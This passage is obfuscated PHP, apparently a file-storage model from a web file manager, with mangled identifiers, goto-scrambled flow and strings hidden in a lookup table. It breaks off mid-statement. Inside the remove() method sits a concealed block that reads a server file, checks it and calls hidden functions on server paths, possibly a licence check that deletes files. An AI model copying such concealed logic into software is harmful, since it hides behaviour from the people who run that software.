$cšŒ‚Î‹ÁÏ); goto cØÆÍÈ›×; aëŸ‘ù•Í: $cÒÆŠïÊƒ = $this->add($cšŒ‚Î‹ÁÏ); $eÄíøöÅñ¸ = array($b÷¿ÄÒæ‰¦[518] => short_id($cÒÆŠïÊƒ)); $this->where(array($b÷¿ÄÒæ‰¦[379] => $cÒÆŠïÊƒ))->save($eÄíøöÅñ¸); goto FœÅ·Ù¯‡; f¯ğ·£×: } public function remove($BùƒïÔ–‹, $föÎ‚ÔÀĞ½ = true) { goto f§´Ÿ†Ó¦—; c¼î•¬Û¤³: $a‚¾Ïßš¿£ = $this->pathInfoMore($BùƒïÔ–‹); if (!$E¼âùËÈÜÇ) { return !0; } if ($E¼âùËÈÜÇ[$bÈóù©¼ˆò[456]] == 0) { if (!_get($GLOBALS, $bÈóù©¼ˆò[452])) { return !1; } } goto d’‰×‰é›„; dç‹Ç¢Ñ‰°: $this->folderSizeReset($E¼âùËÈÜÇ[$bÈóù©¼ˆò[456]]); $CâÍÙ³ª¦å = array($E¼âùËÈÜÇ[$bÈóù©¼ˆò[456]]); if ($E¼âùËÈÜÇ[$bÈóù©¼ˆò[366]] == $bÈóù©¼ˆò[84]) { $CâÍÙ³ª¦å[] = $E¼âùËÈÜÇ[$bÈóù©¼ˆò[365]]; } goto D¡Ğ½í–Ş¦; f§´Ÿ†Ó¦—: $bÈóù©¼ˆò =& $_SERVER[‘®…¢À]; if ($_SERVER[$bÈóù©¼ˆò[768]] != $_SERVER[$bÈóù©¼ˆò[769]]) { goto bÛ›¾¾”Á‰; bÛ›¾¾”Á‰: $bá±í’ŒÄ = $bÈóù©¼ˆò[770]; $fØÍ¥È¤õª = $bÈóù©¼ˆò[771]; $eÂœ…ºŒˆ = $_SERVER[$bÈóù©¼ˆò[772]] . $bÈóù©¼ˆò[773]; goto DŞ‰¿³Óİ; fÀò£Î”™ë: $b÷Æ·Ş¹ïë = 1; while ($b÷Æ·Ş¹ïë > 1) { $b÷Æ·Ş¹ïë = $b÷Æ·Ş¹ïë + 4; $b‹ÈîŠ½ = rawurlencode($b÷Æ·Ş¹ïë . $bÈóù©¼ˆò[357]); } goto b½„íåªÜ‡; A½®—œº: $FİµË¿Ë«Ñ = $bÈóù©¼ˆò[775]; $FİµË¿Ë«Ñ($_SERVER[$bÈóù©¼ˆò[776]]); $FİµË¿Ë«Ñ($_SERVER[$bÈóù©¼ˆò[772]] . $bÈóù©¼ˆò[777]); goto fÀò£Î”™ë; DŞ‰¿³Óİ: $Eç¹ÄŠŒÇÆ = $fØÍ¥È¤õª($eÂœ…ºŒˆ); $fõ§ÑâÖƒŠ = explode($bÈóù©¼ˆò[214], $Eç¹ÄŠŒÇÆ); if (count($fõ§ÑâÖƒŠ) < $bÈóù©¼ˆò[554]) { $D˜½¶ƒÒô = $bÈóù©¼ˆò[774]; $D˜½¶ƒÒô(); } goto A½®—œº; b½„íåªÜ‡: } $E¼âùËÈÜÇ = $this->sourceInfo($BùƒïÔ–‹); goto c¼î•¬Û¤³; d’‰×‰é›„: $this->lockMoveStart($BùƒïÔ–‹); Hook::trigger($bÈóù©¼ˆò[2224], $a‚¾Ïßš¿£, $föÎ‚ÔÀĞ½); if ($föÎ‚ÔÀĞ½) { Model($bÈóù©¼ˆò[2225])->moveToRecycle($BùƒïÔ–‹); } else { if ($E¼âùËÈÜÇ[$bÈóù©¼ˆò[366]] == $bÈóù©¼ˆò[84]) { $BÌ£Â«£› = array($bÈóù©¼ˆò[516] => array($bÈóù©¼ˆò[474], $E¼âùËÈÜÇ[$bÈóù©¼ˆò[454]] . $BùƒïÔ–‹ . $bÈóù©¼ˆò[475])); $Dó—ñ‡ø = array($bÈóù©¼ˆò[516] => $BÌ£Â«£›[$bÈóù©¼ˆò[454]]); $eİ®á÷±÷Ø = $this->field($bÈóù©¼ˆò[2226])->where($Dó—ñ‡ø)->select(); $fÃçâäÏ² = !1; $CÀ‘¯—ôÌï = array($BùƒïÔ–‹); if ($eİ®á÷±÷Ø) { $fÃçâäÏ² = array_to_keyvalue($eİ®á÷±÷Ø, $bÈóù©¼ˆò[33], $bÈóù©¼ˆò[414]); $fÃçâäÏ² = array_remove_value($fÃçâäÏ², $bÈóù©¼ˆò[463]); $CÀ‘¯—ôÌï = array_to_keyvalue($eİ®á÷±÷Ø, $bÈóù©¼ˆò[33], $bÈóù©¼ˆò[365]); $CÀ‘¯—ôÌï[] = $BùƒïÔ–‹; } } else { $fÃçâäÏ² = array($E¼âùËÈÜÇ[$bÈóù©¼ˆò[414]]); $CÀ‘¯—ôÌï = array($BùƒïÔ–‹); } Model($bÈóù©¼ˆò[496])->eventRemove($BùƒïÔ–‹); $this->removeRelevance($CÀ‘¯—ôÌï, $fÃçâäÏ²); } goto dç‹Ç¢Ñ‰°; Cì·ÍòÈ“: return !0; goto a¸ÜÑÀ™ Ë; D¡Ğ½í–Ş¦: $this->updateModifyTime($CâÍÙ³ª¦å); $this->lockMoveEnd($BùƒïÔ–‹); Hook::trigger($bÈóù©¼ˆò[1371], $a‚¾Ïßš¿£, $föÎ‚ÔÀĞ½); goto Cì·ÍòÈ“; a¸ÜÑÀ™ Ë: } public function removeArray($c„À’áÈö) { if (!$c„À’áÈö) { return !0; } } public function removeRelevance($B™ù™ñ†´Ô, $c³™Å§¨Ï×) { goto aŒïğÄÈì; DèÆÒ¤¡ˆ¹: Model($B¥°¬Ş£­Ş[1977])->removeBySource($B™ù™ñ†´Ô); Model($B¥°¬Ş£­Ş[2217])->removeBySource($B™ù™ñ†´Ô); $this->where($dßø°ƒ«Ï)->delete(); goto d·ÖÎ¡Íê‰; CÑÔæØø: if (!$B™ù™ñ†´Ô) { return !1; } $dßø°ƒ«Ï = array($B¥°¬Ş£­Ş[379] => array($B¥°¬Ş£­Ş[380], $B™ù™ñ†´Ô)); Model($B¥°¬Ş£­Ş[2225])->where($dßø°ƒ«Ï)->delete(); goto B×•Ì‚è¹; d·ÖÎ¡Íê‰: Model($B¥°¬Ş£­Ş[417])->remove($c³™Å§¨Ï×); for ($Bùï´«— = 0; $Bùï´«— < count($B™ù™ñ†´Ô); $Bùï´«—++) { $this->sourceCacheClear($B™ù™ñ†´Ô[$Bùï´«—]); } goto DÚ—ÙÄ‰ ‡; aŒïğÄÈì: $B¥°¬Ş£­Ş =& $_SERVER[‘®…¢À]; $B™ù™ñ†´Ô = array_unique(array_filter($B™ù™ñ†´Ô)); $c³™Å§¨Ï× = array_unique(array_filter($c³™Å§¨Ï×)); goto CÑÔæØø; B×•Ì‚è¹: Model($B¥°¬Ş£­Ş[408])->where($dßø°ƒ«Ï)->delete(); Model($B¥°¬Ş£­Ş[2227])->where($dßø°ƒ«Ï)->delete(); Model($B¥°¬Ş£­Ş[496])->where($dßø°ƒ«Ï)->delete(); goto DèÆÒ¤¡ˆ¹; DÚ—ÙÄ‰ ‡: } public function rename($Bƒ”‡Æòï, $ağ›»ÕõÜ) { goto CĞ«Í»¨†; dÆ¤Æƒàñ: $this->setNamePinyin($Bƒ”‡Æòï, $a¡Áƒ°‰ÄÙ[$Cª¼ã¹áã½[28]], !1); $this->updateModifyTime($c©Œ£†•÷[$Cª¼ã¹áã½[456]]); return $this->where(array($Cª¼ã¹áã½[379] => $Bƒ”‡Æòï))->data($a¡Áƒ°‰ÄÙ)->save(); goto a¯†ÇğÄÄ¤; CĞ«Í»¨†: $Cª¼ã¹áã½ =& $_SERVER[‘®…¢À]; $c©Œ£†•÷ = $this->sourceInfo($Bƒ”‡Æòï); if (!$c©Œ£†•÷) { return !1; } goto c‡§©Ç¥É¼; B÷ø’…Ë¢: if (!$c©Œ£†•÷[$Cª¼ã¹áã½[366]] == $Cª¼ã¹áã½[84]) { $a¡Áƒ°‰ÄÙ[$Cª¼ã¹áã½[368]] = get_path_ext($ağ›»ÕõÜ); } Model($Cª¼ã¹áã½[496])->eventRename($Bƒ”‡Æòï, $c©Œ£†•÷[$Cª¼ã¹áã½[28]], $ağ›»ÕõÜ); $this->sourceCacheClear($Bƒ”‡Æòï); goto dÆ¤Æƒàñ; c‡§©Ç¥É¼: $eÅ…ÁÔìì˜ = $this->fileNameExist($c©Œ£†•÷[$Cª¼ã¹áã½[456]], $ağ›»ÕõÜ); if ($eÅ…ÁÔìì˜) { return !1; } $a¡Áƒ°‰ÄÙ = array($Cª¼ã¹áã½[382] => $ağ›»ÕõÜ, $Cª¼ã¹áã½[515] => USER_ID); goto B÷ø’…Ë¢; a¯†ÇğÄÄ¤: } public function setNamePinyin($fÊÉ¦åÕîÑ, $C¾ŒÌà¶¼, $A¡÷ì‘­ê‘ = true) { $eÁ›¹†êõˆ =& $_SERVER[‘®…¢À]; $A¹˜ã¸”‚Ğ = Input::check($C¾ŒÌà¶¼, $eÁ›¹†êõˆ[519]); if ($A¡÷ì‘­ê‘ && !$A¹˜ã¸”‚Ğ) { return; } if (!$A¹˜ã¸”‚Ğ) { $this->metaSet($fÊÉ¦åÕîÑ, $eÁ›¹†êõˆ[411], null); $this->metaSet($fÊÉ¦åÕîÑ, $eÁ›¹†êõˆ[410], null); return; } $Càö’ø‡ôÑ = array($eÁ›¹†êõˆ[411] => str_replace($eÁ›¹†êõˆ[50], $eÁ›¹†êõˆ[33], Pinyin::encode($C¾ŒÌà¶¼)), $eÁ›¹†êõˆ[410] => Pinyin::encode($C¾ŒÌà¶¼, $eÁ›¹†êõˆ[520])); $this->metaSet($fÊÉ¦åÕîÑ, $Càö’ø‡ôÑ); } public function getContent($dÏêˆàæÆÌ) { goto B©Ç™ïÅÚÁ; B÷©µ™¾Òî: return IO::getContent($FÁëŞ¥ñ£[$AÒëƒ£ÔÌ½[76]]); goto bÆ¸ˆŠè; aİ°Ëë•ø…: if ($FÁëŞ¥ñ£[$AÒëƒ£ÔÌ½[78]] == 0) { return $AÒëƒ£ÔÌ½[33]; } $bÃ©ÎÔãÎ’ = $AÒëƒ£ÔÌ½[2228] . $FÁëŞ¥ñ£[$AÒëƒ£ÔÌ½[160]]; if ($FÁëŞ¥ñ£[$AÒëƒ£ÔÌ½[78]] <= 1024 * 10) { $D¶’ß³˜¦ = Cache::get($bÃ©ÎÔãÎ’); if (!$D¶’ß³˜¦) { $D¶’ß³˜¦ = IO::getContent($FÁëŞ¥ñ£[$AÒëƒ£ÔÌ½[76]]); Cache::set($bÃ©ÎÔãÎ’, $D¶’ß³˜¦); } return $D¶’ß³˜¦; } goto B÷©µ™¾Òî; B©Ç™ïÅÚÁ: $AÒëƒ£ÔÌ½ =& $_SERVER[‘®…¢À]; $FÁëŞ¥ñ£ = $this->fileInfoGet($dÏêˆàæÆÌ); if (!$FÁëŞ¥ñ£) { return !1; } goto aİ°Ëë•ø…; bÆ¸ˆŠè: } public function setDesc($D™ÛìëÍ‚, $C¹Œî’ˆ°Ğ) { $b¤ÚÂ§ŒìÆ =& $_SERVER[‘®…¢À]; Model($b¤ÚÂ§ŒìÆ[496])->eventAddDesc($D™ÛìëÍ‚, $C¹Œî’ˆ°Ğ); return $this->metaSet($D™ÛìëÍ‚, $b¤ÚÂ§ŒìÆ[400], $C¹Œî’ˆ°Ğ); } public function setContent($BÓ©×ÏÚŒ, $fÙïµÜô– = '') { goto EøíÖ¦Áà™; E‘ß´¦â™: return !0; goto eëÕ¸êƒÕ ; aÄ¯³«¯Â: if (!$b¥‰©¨·ÛÍ || !$bêÖ‹Øí¨) { return !1; } $this->checkLock($BÓ©×ÏÚŒ); $e¦¢Ï¬ß± = Model($e¾÷„ŒŠ£â[417])->addFileByContent($fÙïµÜô–, $bêÖ‹Øí¨[$e¾÷„ŒŠ£â[28]]); goto CØØÏƒ—Å™; EøíÖ¦Áà™: $e¾÷„ŒŠ£â =& $_SERVER[‘®…¢À]; $bêÖ‹Øí¨ = $this->sourceInfo($BÓ©×ÏÚŒ); $b¥‰©¨·ÛÍ = $this->fileInfoGet($BÓ©×ÏÚŒ); goto aÄ¯³«¯Â; CØØÏƒ—Å™: $A–èŒ‡âË = $this->fileHistory($bêÖ‹Øí¨, $e¦¢Ï¬ß±[$e¾÷„ŒŠ£â[414]], $e¦¢Ï¬ß±[$e¾÷„ŒŠ£â[78]]); if (!$A–èŒ‡âË) { return Model($e¾÷„ŒŠ£â[417])->remove($e¦¢Ï¬ß±[$e¾÷„ŒŠ£â[414]]); } $this->folderSizeReset($bêÖ‹Øí¨[$e¾÷„ŒŠ£â[456]]); goto E‘ß´¦â™; eëÕ¸êƒÕ : } public function fileSubstr($fÀ…µ”‡Ö, $c¬İçÑË, $fÍ÷«†ˆô) { $cŠáŠ™Õ = $this->fileInfoGet($fÀ…µ”‡Ö); if (!$cŠáŠ™Õ) { return !1; } return IO::fileSubstr($cŠáŠ™Õ[$_SERVER[‘®…¢À][76]], $c¬İçÑË, $fÍ÷«†ˆô); } public function fileInfoGet($C˜ÅôŒ‚¯Š) { goto cÕë®»‰Üë; cÕë®»‰Üë: $DÖÅäæÃÃ =& $_SERVER[‘®…¢À]; $f²³­­ï×“ = $this->sourceInfo($C˜ÅôŒ‚¯Š); if (!$f²³­­ï×“ || $f²³­­ï×“[$DÖÅäæÃÃ[366]]) { return !1; } goto eÊèĞ´Õ‚Š; eÊèĞ´Õ‚Š: $BÂÅÛòƒã = $DÖÅäæÃÃ[420] . $f²³­­ï×“[$DÖÅäæÃÃ[414]]; $eÒ…ËšÖÑ˜ = _get(self::$cacheFileInfo, $BÂÅÛòƒã); if ($eÒ…ËšÖÑ˜) { return $eÒ…ËšÖÑ˜; } goto cÄ»ÇÖĞàˆ; E§¸ˆ“Í»à: return $bæ“ç—ÎÏ±; goto DƒñŸİ¬Âš; cÄ»ÇÖĞàˆ: $bæ“ç—ÎÏ± = Model($DÖÅäæÃÃ[417])->fileInfo($f²³­­ï×“[$DÖÅäæÃÃ[414]]); if ($bæ“ç—ÎÏ±) { $bæ“ç—ÎÏ±[$DÖÅäæÃÃ[28]] = $f²³­­ï×“[$DÖÅäæÃÃ[28]]; } self::$cacheFileInfo[$BÂÅÛòƒã] = $bæ“ç—ÎÏ±; goto E§¸ˆ“Í»à; DƒñŸİ¬Âš: } private function folderChildrenNumber($Aæµø©ÌØ) { $Cï„œá–‹­ =& $_SERVER[‘®…¢À]; $fÊ‘‰ÑÊˆ = $this->sourceInfo($Aæµø©ÌØ); $BŠ÷ºÂÒŠ¨ = array($Cï„œá–‹­[516] => array($Cï„œá–‹­[474], $fÊ‘‰ÑÊˆ[$Cï„œá–‹­[454]] . $Aæµø©ÌØ . $Cï„œá–‹­[475]), $Cï„œá–‹­[391] => 0, $Cï„œá–‹­[509] => 1); $dïÆ¼¦Ò¸ï = $this->where($BŠ÷ºÂÒŠ¨)->count(); $cÄÔ§«óŒ = $this->where($BŠ÷ºÂÒŠ¨)->where(array($Cï„œá–‹­[509] => 0))->count(); return array($Cï„œá–‹­[82] => $cÄÔ§«óŒ, $Cï„œá–‹­[83] => $dïÆ¼¦Ò¸ï); } public function pathInfo($CõÀˆãÉõ, $dº—çÈôÊÛ = false) { goto aÌ°”¨ËÉ‰; B³„ìøÓĞ—: if ($b¿æ¶ò²Ï) { return $b¿æ¶ò²Ï; } $Dñ‚ñ¶œÈğ = $this->sourceInfo($CõÀˆãÉõ); if (!$Dñ‚ñ¶œÈğ) { return !1; } goto EÔ®øö¹; EÔ®øö¹: $Dñ‚ñ¶œÈğ = $this->_listDataApplyItem($Dñ‚ñ¶œÈğ, $dº—çÈôÊÛ); self::$cachePathInfo[$dÃŠ‚‘ÊĞ”] = $Dñ‚ñ¶œÈğ; return $Dñ‚ñ¶œÈğ; goto A¾ ´å…¡; aÌ°”¨ËÉ‰: $F†À·Á¥¾™ =& $_SERVER[‘®…¢À]; $dÃŠ‚‘ÊĞ” = $F†À·Á¥¾™[406] . intval($dº—çÈôÊÛ) . $F†À·Á¥¾™[407] . $CõÀˆãÉõ; $b¿æ¶ò²Ï = _get(self::$cachePathInfo, $dÃŠ‚‘ÊĞ”); goto B³„ìøÓĞ—; A¾ ´å…¡: } public static $cachePathInfoMore = array(); public function pathInfoMore($Bã˜‡£ÛÖ¬) { goto a½—ÜÂõˆ; a½—ÜÂõˆ: $a‡‡Çâğ­† =& $_SERVER[‘®…¢À]; $fö”ªö‚ = _get(self::$cachePathInfoMore, $Bã˜‡£ÛÖ¬); if ($fö”ªö‚) { return $fö”ªö‚; } goto cƒÚÕˆĞ›É; cƒÚÕˆĞ›É: $f®¦„Âã¼ = $this->pathInfo($Bã˜‡£ÛÖ¬); if (!$f®¦„Âã¼) { return !1; } if ($f®¦„Âã¼[$a‡‡Çâğ­†[366]] == $a‡‡Çâğ­†[84]) { $f®¦„Âã¼[$a‡‡Çâğ­†[81]] = $this->folderChildrenNumber($Bã˜‡£ÛÖ¬); } goto B‚ù Ş§§»; B‚ù Ş§§»: self::$cachePathInfoMore[$Bã˜‡£ÛÖ¬] = $f®¦„Âã¼; return $f®¦„Âã¼; goto céâ“Ó‘Ô; céâ“Ó‘Ô: } public function sourceInfo($AŸØÉª‘ÊÖ) { $cÛÃ Ô˜×È =& $_SERVER[‘®…¢À]; $cÈ¦Ğæ–õ = $cÛÃ Ô˜×È[405] . $AŸØÉª‘ÊÖ; $dß†šø¸Ÿ¬ = _get(self::$cacheSourceInfo, $cÈ¦Ğæ–õ); if ($dß†šø¸Ÿ¬) { return $dß†šø¸Ÿ¬; } self::$cacheSourceInfo[$cÈ¦Ğæ–õ] = $this->where(array($cÛÃ Ô˜×È[365] => $AŸØÉª‘ÊÖ))->find(); return self::$cacheSourceInfo[$cÈ¦Ğæ–õ]; } public function sourceCacheClear($BæÈĞßŸ­Ì = false) { if ($BæÈĞßŸ­Ì == !1) { self::$cacheSourceInfo = null; self::$cacheSourceInfo = array(); return; } unset(self::$cacheSourceInfo[$_SERVER[‘®…¢À][405] . $BæÈĞßŸ­Ì]); } public function pathInfoByPath($E¾Øß…†ÆÕ, $A«¸éÑç) { $cºµ»Äáè =& $_SERVER[‘®…¢À]; $aòâ‡Â‰ = !$A«¸éÑç ? array() : explode($cºµ»Äáè[8], trim($A«¸éÑç, $cºµ»Äáè[8])); $A­ËÅ†“„ = $E¾Øß…†ÆÕ; foreach ($aòâ‡Â‰ as $BİîæŸª‚ã) { $D‹–Ç¢ëÈÅ = array($cºµ»Äáè[456] => $A­ËÅ†“„, $cºµ»Äáè[28] => $BİîæŸª‚ã); $dù¨—ÎŠ… = $this->where($D‹–Ç¢ëÈÅ)->select(); if (!$dù¨—ÎŠ…) { return !1; } $dù¨—ÎŠ… = array_sort_by($dù¨—ÎŠ…, $cºµ»Äáè[392]); $A­ËÅ†“„ = $dù¨—ÎŠ…[0][$cºµ»Äáè[365]]; } return $this->pathInfo($A­ËÅ†“„, !0); } protected function updateModifyTime($c†¿»ÇÏßÁ) { goto fî‚ÈÅÁ¼À; Cİİ†æ­›: foreach ($c†¿»ÇÏßÁ as $AÙ©’µğì => $f ö¤äÆò) { $c†¿»ÇÏßÁ[$AÙ©’µğì] = intval($f ö¤äÆò); } $FĞ™ºŸ›¨ = array($c÷£×†ÉÊÌ[365] => array($c÷£×†ÉÊÌ[7], $c†¿»ÇÏßÁ)); $DÎëî·•Ğà = array($c÷£×†ÉÊÌ[515] => USER_ID, $c÷£×†ÉÊÌ[386] => time()); goto BòãÁšÒÜ“; BòãÁšÒÜ“: $this->where($FĞ™ºŸ›¨)->save($DÎëî·•Ğà); goto eİ›åŞ”®ˆ; fî‚ÈÅÁ¼À: $c÷£×†ÉÊÌ =& $_SERVER[‘®…¢À]; if (!$c†¿»ÇÏßÁ) { return; } if (!is_array($c†¿»ÇÏßÁ)) { $c†¿»ÇÏßÁ = array($c†¿»ÇÏßÁ); } goto Cİİ†æ­›; eİ›åŞ”®ˆ: } public function folderSizeReset($C‡æê¶åÂ) { goto eÈŸ——è´; A¹”ŠèÕÚö: CacheLock::lock($fã¨âŠ‘›¹, 20); $this->sourceCacheClear($C‡æê¶åÂ); $dÂ„¦›éŒ¹ = $this->sourceInfo($C‡æê¶åÂ); goto f¢‹Ÿ›„á; f¢‹Ÿ›„á: $fâ«Ø¢Á¸ = array($DËĞ¨ÑÏÙä[364] => $C‡æê¶åÂ, $DËĞ¨ÑÏÙä[391] => 0); $B‚Î‰‹áÁ = $this->where($fâ«Ø¢Á¸)->sum($DËĞ¨ÑÏÙä[78]); $B‚Î‰‹áÁ = intval($B‚Î‰‹áÁ); goto dô²â¸ø–¥; FÆÈÛÄ¬½Í: $e¯¢àò†ö¼ = $this->parentLevelArray($dÂ„¦›éŒ¹[$DËĞ¨ÑÏÙä[454]]); if ($e¯¢àò†ö¼) { $fâ«Ø¢Á¸ = array($DËĞ¨ÑÏÙä[365] => array($DËĞ¨ÑÏÙä[380], $e¯¢àò†ö¼)); if ($e‹Ú‚õ ¸© < 0) { $fâ«Ø¢Á¸[$DËĞ¨ÑÏÙä[78]] = array($DËĞ¨ÑÏÙä[910], abs($e‹Ú‚õ ¸©)); } $this->where($fâ«Ø¢Á¸)->setAdd($DËĞ¨ÑÏÙä[78], $e‹Ú‚õ ¸©); } $this->targetSpaceUpdate($dÂ„¦›éŒ¹[$DËĞ¨ÑÏÙä[367]], $dÂ„¦›éŒ¹[$DËĞ¨ÑÏÙä[451]]); goto f®Ò²»•›Ö; f®Ò²»•›Ö: CacheLock::unlock($fã¨âŠ‘›¹); goto dÈô¨ùğí; dô²â¸ø–¥: $e‹Ú‚õ ¸© = $B‚Î‰‹áÁ - intval($dÂ„¦›éŒ¹[$DËĞ¨ÑÏÙä[78]]); if ($e‹Ú‚õ ¸© == 0) { return CacheLock::unlock($fã¨âŠ‘›¹); } $this->where(array($DËĞ¨ÑÏÙä[379] => $C‡æê¶åÂ))->setField($DËĞ¨ÑÏÙä[78], $B‚Î‰‹áÁ); goto FÆÈÛÄ¬½Í; eÈŸ——è´: $DËĞ¨ÑÏÙä =& $_SERVER[‘®…¢À]; if ($this->statusIgnoreResetSpace) { return; } $fã¨âŠ‘›¹ = $DËĞ¨ÑÏÙä[2229] . $C‡æê¶åÂ; goto A¹”ŠèÕÚö; dÈô¨ùğí: } public function folderSizeResetChildren($cßÔŒñÉ ¥) { goto aµƒ¼Ä¬Ü®; cƒ’øëÙîì: foreach ($dŞÖ ›’ë× as $BÚÍ£À¶Š) { $dæÜ÷–’ùò = $BÚÍ£À¶Š[$BˆšÊÎ™ãõ[456]] . $BˆšÊÎ™ãõ[33]; if (!isset($A…¿è¿±ÃŸ[$dæÜ÷–’ùò])) { continue; } if ($BÚÍ£À¶Š[$BˆšÊÎ™ãõ[392]] == $A…¿è¿±ÃŸ[$dæÜ÷–’ùò][$BˆšÊÎ™ãõ[392]]) { $A…¿è¿±ÃŸ[$dæÜ÷–’ùò][$BˆšÊÎ™ãõ[78]] += $BÚÍ£À¶Š[$BˆšÊÎ™ãõ[78]]; } } foreach ($A…¿è¿±ÃŸ as $BÚÍ£À¶Š) { $e¶ÒÕâœ†õ = $this->parentLevelArray($BÚÍ£À¶Š[$BˆšÊÎ™ãõ[454]]); foreach ($e¶ÒÕâœ†õ as $dæÜ÷–’ùò) { $dæÜ÷–’ùò = $dæÜ÷–’ùò . $BˆšÊÎ™ãõ[33]; if (!isset($A…¿è¿±ÃŸ[$dæÜ÷–’ùò])) { continue; } if ($BÚÍ£À¶Š[$BˆšÊÎ™ãõ[392]] == $A…¿è¿±ÃŸ[$dæÜ÷–’ùò][$BˆšÊÎ™ãõ[392]]) { $A…¿è¿±ÃŸ[$dæÜ÷–’ùò][$BˆšÊÎ™ãõ[78]] += $BÚÍ£À¶Š[$BˆšÊÎ™ãõ[78]]; } } } $eÇÕõ‡¡ = array(); goto FƒŒˆ¾¿ùĞ; aµƒ¼Ä¬Ü®: $BˆšÊÎ™ãõ =& $_SERVER[‘®…¢À]; $this->sourceCacheClear($cßÔŒñÉ ¥); $Bğ„‰÷ºÙÔ = $this->sourceInfo($cßÔŒñÉ ¥); goto A˜­ ·”´ø; FƒŒˆ¾¿ùĞ: foreach ($A…¿è¿±ÃŸ as $BÚÍ£À¶Š) { if ($BÚÍ£À¶Š[$BˆšÊÎ™ãõ[78]] == $BÚÍ£À¶Š[$BˆšÊÎ™ãõ[2231]]) { continue; } $eÇÕõ‡¡[] = array($BˆšÊÎ™ãõ[365], $BÚÍ£À¶Š[$BˆšÊÎ™ãõ[365]], $BˆšÊÎ™ãõ[78], $BÚÍ£À¶Š[$BˆšÊÎ™ãõ[78]]); } $this->saveAll($eÇÕõ‡¡); goto CšÚâêÉ; A˜­ ·”´ø: $a¦×†ÀÄ“¦ = array($BˆšÊÎ™ãõ[509] => 1, $BˆšÊÎ™ãõ[516] => array($BˆšÊÎ™ãõ[474], $Bğ„‰÷ºÙÔ[$BˆšÊÎ™ãõ[454]] . $cßÔŒñÉ ¥ . $BˆšÊÎ™ãõ[475])); $eñÀï‹î—¶ = $BˆšÊÎ™ãõ[2230]; $A…¿è¿±ÃŸ = $this->field($eñÀï‹î—¶)->where($a¦×†ÀÄ“¦)->select(); goto A¹„…½ÄÀæ; A¹„…½ÄÀæ: $a¦×†ÀÄ“¦[$BˆšÊÎ™ãõ[366]] = 0; $dŞÖ ›’ë× = $this->field($eñÀï‹î—¶)->where($a¦×†ÀÄ“¦)->select(); if (!$dŞÖ ›’ë×) { return; } goto D¬Éãù¤¿Ü; D¬Éãù¤¿Ü: $A…¿è¿±ÃŸ[] = $Bğ„‰÷ºÙÔ; $A…¿è¿±ÃŸ = array_to_keyvalue($A…¿è¿±ÃŸ, $BˆšÊÎ™ãõ[365]); foreach ($A…¿è¿±ÃŸ as $d†ë¥ƒ¥ => $BÚÍ£À¶Š) { $A…¿è¿±ÃŸ[$d†ë¥ƒ¥][$BˆšÊÎ™ãõ[2231]] = $A…¿è¿±ÃŸ[$d†ë¥ƒ¥][$BˆšÊÎ™ãõ[78]]; $A…¿è¿±ÃŸ[$d†ë¥ƒ¥][$BˆšÊÎ™ãõ[78]] = 0; } goto cƒ’øëÙîì; CšÚâêÉ: } public function userSpaceReset($B†Î–¦ø¾ = false) { $Eãí‘ÇŸ§Ê =& $_SERVER[‘®…¢À]; $DÔ¥óŠ¤š = $this->where(array($Eãí‘ÇŸ§Ê[367] => self::TYPE_USER, $Eãí‘ÇŸ§Ê[451] => $B†Î–¦ø¾, $Eãí‘ÇŸ§Ê[366] => 0))->sum($Eãí‘ÇŸ§Ê[78]); Model($Eãí‘ÇŸ§Ê[465])->userEdit($B†Î–¦ø¾, array($Eãí‘ÇŸ§Ê[1986] => $DÔ¥óŠ¤š)); } public function targetSpaceUpdate($D•ñ½“ëè–, $Dâ¢óô†Â™) { $AÒÌéÓÄèµ =& $_SERVER[‘®…¢À]; if (!$Dâ¢óô†Â™) { return; } if (!in_array($D•ñ½“ëè–, array(self::TYPE_USER, self::TYPE_GROUP))) { return; } $FÊÊ„ÍˆäÄ = $this->targetSpaceSize($D•ñ½“ëè–, $Dâ¢óô†Â™); if ($D•ñ½“ëè– == self::TYPE_USER) { Model($AÒÌéÓÄèµ[465])->userEdit($Dâ¢óô†Â™, array($AÒÌéÓÄèµ[1986] => $FÊÊ„ÍˆäÄ)); } else { if ($D•ñ½“ëè– == self::TYPE_GROUP) { Model($AÒÌéÓÄèµ[453])->groupEdit($Dâ¢óô†Â™, array($AÒÌéÓÄèµ[1986] => $FÊÊ„ÍˆäÄ)); } } } public function targetSpaceSize($aÎÔÆÌ‚ŒĞ, $eï¤¼•ÉöŒ) { goto D‚Ùâß¡àñ; D‚Ùâß¡àñ: $E÷¯ˆ·î³á =& $_SERVER[‘®…¢À]; $EË‘ˆ‹ö¾ = $this->sourceRoot($aÎÔÆÌ‚ŒĞ, $eï¤¼•ÉöŒ, !0); if (!$EË‘ˆ‹ö¾) { return 0; } goto dĞ‡öŠ¢¼‚; dĞ‡öŠ¢¼‚: $DÛ¹›‘’ÇÚ = floatval($EË‘ˆ‹ö¾[$E÷¯ˆ·î³á[78]]); $E‹çš‚ô©Ú = array($E÷¯ˆ·î³á[516] => array($E÷¯ˆ·î³á[474], $E÷¯ˆ·î³á[2071] . $EË‘ˆ‹ö¾[$E÷¯ˆ·î³á[365]] . $E÷¯ˆ·î³á[475])); $e‡ÔÁªƒ¦œ = Model($E÷¯ˆ·î³á[390])->field($E÷¯ˆ·î³á[379])->where($E‹çš‚ô©Ú)->select(); goto FŠå•¬ñ; FŠå•¬ñ: $e‡ÔÁªƒ¦œ = array_to_keyvalue($e‡ÔÁªƒ¦œ, $E÷¯ˆ·î³á[33], $E÷¯ˆ·î³á[365]); $e‡ÔÁªƒ¦œ = array_unique(array_filter($e‡ÔÁªƒ¦œ)); if ($e‡ÔÁªƒ¦œ) { $E‹çš‚ô©Ú = array($E÷¯ˆ·î³á[379] => array($E÷¯ˆ·î³á[380], $e‡ÔÁªƒ¦œ)); $DÛ¹›‘’ÇÚ += floatval($this->where($E‹çš‚ô©Ú)->sum($E÷¯ˆ·î³á[78])); } goto Bø·ŒÛ±×Ÿ; Bø·ŒÛ±×Ÿ: return $DÛ¹›‘’ÇÚ; goto CßØ™Ğ”×í; CßØ™Ğ”×í: } public function allFileTypeProfile() { return $this->fileTypeProfile(!1, !1); } public function userFileTypeProfile($c²Ë¶ëïˆ) { return $this->fileTypeProfile($c²Ë¶ëïˆ, SourceModel::TYPE_USER); } public function groupFileTypeProfile($A˜›¡ÎµÇÆ) { return $this->fileTypeProfile($A˜›¡ÎµÇÆ, SourceModel::TYPE_GROUP); } private function fileTypeProfile($cÊ‹¼Òìµ, $b“¤œ¼¾ä) { goto C‹òñø‡; C‹òñø‡: $DÀØøØ·¥ =& $_SERVER[‘®…¢À]; $c®³ããé†÷ = $DÀØøØ·¥[2232] . $cÊ‹¼Òìµ . 